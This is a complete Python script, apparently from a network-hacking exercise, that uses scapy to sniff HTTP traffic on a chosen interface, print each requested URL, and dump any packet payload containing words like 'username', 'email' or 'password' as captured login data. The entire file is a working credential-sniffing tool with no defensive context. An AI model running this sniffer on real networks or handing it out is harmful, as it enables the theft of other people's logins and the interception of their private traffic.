#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse


def parsing():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="The sniffed Interface")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify the interface using -i option.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "email", "password", "Password"]
        for keyword in keywords:
            if keyword.encode() in load:  
                return load


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> {0}".format(url.decode()))
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible Username / Password >> {0}\n\n".format(login_info.decode()))


options = parsing()
sniff(options.interface)
